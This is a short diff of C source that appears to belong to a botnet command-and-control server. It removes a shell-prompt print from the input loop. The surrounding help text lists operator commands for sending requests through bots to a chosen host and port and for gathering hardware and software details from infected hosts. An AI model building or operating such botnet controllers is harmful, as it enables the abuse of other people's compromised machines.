@@ -129,7 +129,6 @@ void *user_input_thread(void *arg) {
         if (strcmp(command, "list\n") == 0) {
             // Eseguire un'azione di uscita o terminare il server
             printf("1) request {hostname:port}\n Send a request to a specified hostname and port via bot.\n\n2) hardware-info\n Receive hardware and software information about hosts connected to this botnet.\n\n");
-            printf("$ ");
         }
         //exit
         if (strcmp(command, "exit\n") == 0) {
